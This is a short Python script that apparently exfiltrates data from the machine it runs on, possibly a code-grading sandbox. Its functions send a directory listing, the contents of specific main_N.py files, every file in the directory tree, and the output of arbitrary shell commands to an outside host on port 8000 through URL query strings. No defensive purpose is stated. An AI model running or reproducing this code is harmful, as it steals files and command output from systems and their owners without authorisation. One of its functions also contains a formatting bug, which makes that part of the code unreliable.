#!/usr/bin/python3

import os
from urllib.parse import quote
import urllib.request

# domain = '0.0.0.0'
domain = '9d52da8d9d27.cd1b02d9.alx-cod.online'
base_url = 'http://{}:8000/POST?textarea='.format(domain)

def checker():
    data = os.listdir('.')
    url = '{}{}'.format(base_url, quote(str(data)))
    req = urllib.request.Request(url=url)
    with urllib.request.urlopen(req) as f:
        f.read().decode('utf-8')

def walker():
    import os
    # for i in list(os.listdir('./')):
    for i in ['./main_0.py', './main_1.py', './main_2.py', './main_3.py', './main_4.py', './main_5.py', './main_6.py', './main_7.py', './main_8.py']:
        # with open('./main_1.py', 'r') as f:
        url = '{}{}'.format(base_url, quote(str([i])))
        req = urllib.request.Request(url=url)
        with urllib.request.urlopen(req) as fr:
            fr.read().decode('utf-8')
        with open(i, 'r') as f:
            data = f.read()
        url = '{}{}'.format(base_url, quote(str(data)))
        req = urllib.request.Request(url=url)
        with urllib.request.urlopen(req) as fr:
            fr.read().decode('utf-8')


def walker2():
    import os
    for folderName, subfolders, filenames in os.walk('.'):
        for filename in filenames:
            current_path = '{}/{}'.format(folderName, filename)
            url0 = '{}{}'.format(base_url, quote(str("="*35)))
            req = urllib.request.Request(url=url0)
            with urllib.request.urlopen(req) as f:
                f.read().decode('utf-8')
            url1 = '{}{}'.format(base_url, quote(str(current_path)))
            req = urllib.request.Request(url=url1)
            with urllib.request.urlopen(req) as f:
                f.read().decode('utf-8')
            url0 = '{}{}'.format(base_url, quote(str("="*35)))
            req = urllib.request.Request(url=url0)
            with urllib.request.urlopen(req) as f:
                f.read().decode('utf-8')
            print('Current path {} and size(b)={}'.format(current_path, os.path.getsize(current_path)))
            with open(current_path) as f:
                file_contents = f.read()
            url2 = '{}{}'.format(base_url, quote(str(file_contents)))
            req = urllib.request.Request(url=url2)
            with urllib.request.urlopen(req) as f:
                f.read().decode('utf-8')
        print('')

def cmdrunner(cmd):
    import subprocess
    cmd_split = cmd.split(' ')
    data = subprocess.Popen(cmd_split, stdout = subprocess.PIPE).communicate()
    # data = os.system(cmd)
    url = '{base_url}{}'.format(base_url, quote(str(data)))
    req = urllib.request.Request(url=url)
    with urllib.request.urlopen(req) as f:
        f.read().decode('utf-8')

# checker()
# walker()